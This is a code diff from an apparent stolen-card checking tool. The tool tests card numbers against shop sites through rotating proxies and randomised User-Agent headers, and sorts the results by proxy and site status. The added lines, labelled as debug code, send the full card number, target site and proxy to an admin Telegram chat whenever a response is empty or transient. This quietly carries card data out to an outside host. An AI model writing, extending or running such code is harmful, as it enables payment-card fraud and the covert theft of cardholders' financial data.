@@ -5845,10 +5845,18 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
             const resp = await fetch(apiUrl, { method: "GET", headers: { 'Accept': 'application/json, text/plain, */*', 'User-Agent': mshUserAgents[Math.floor(Math.random() * mshUserAgents.length)], 'Cache-Control': 'no-cache' }, signal: controller.signal });
             clearTimeout(timeout);
             const rawText = await resp.text();
-            if (!rawText || rawText.trim() === '') return { status: 'unknown', message: 'Empty', price: 0, priceStr: '$0.00', proxyDead: false, siteDead: false, response: '' };
+            if (!rawText || rawText.trim() === '') {
+              // Debug: send empty response to admin
+              sendTelegramMessage(ADMIN_CHAT_ID, `🐛 <b>MSH Debug: Empty Response</b>\n\n<b>Card:</b> <code>${cardCC}</code>\n<b>Site:</b> ${siteUrl}\n<b>Proxy:</b> ${proxy}\n<b>HTTP Status:</b> ${resp.status}\n<b>Raw:</b> <i>(empty)</i>`).catch(() => {});
+              return { status: 'unknown', message: 'Empty', price: 0, priceStr: '$0.00', proxyDead: false, siteDead: false, response: '' };
+            }
             const rawLower = rawText.toLowerCase();
-            if (rawLower.includes('failed to perform') || rawLower.includes('getaddrinfo') || rawLower.includes('could not resolve proxy') || rawLower.includes('tokenize_fail') || rawLower.includes('no_session_token'))
+            if (rawLower.includes('failed to perform') || rawLower.includes('getaddrinfo') || rawLower.includes('could not resolve proxy') || rawLower.includes('tokenize_fail') || rawLower.includes('no_session_token')) {
+              // Debug: send transient response to admin
+              const truncRaw = rawText.length > 500 ? rawText.slice(0, 500) + '...' : rawText;
+              sendTelegramMessage(ADMIN_CHAT_ID, `🐛 <b>MSH Debug: Transient</b>\n\n<b>Card:</b> <code>${cardCC}</code>\n<b>Site:</b> ${siteUrl}\n<b>Proxy:</b> ${proxy}\n<b>Raw:</b> <pre>${escapeHtml(truncRaw)}</pre>`).catch(() => {});
               return { status: 'unknown', message: 'Transient', price: 0, priceStr: '$0.00', proxyDead: false, siteDead: false, response: '' };
+            }
             if (mshProxyDeadIndicators.some(ind => rawLower.includes(ind)))
               return { status: 'dead', message: 'Proxy Dead', price: 0, priceStr: '$0.00', proxyDead: true, siteDead: false, response: 'Proxy Dead' };
             if (mshSiteDeadIndicators.some(ind => rawLower.includes(ind)))
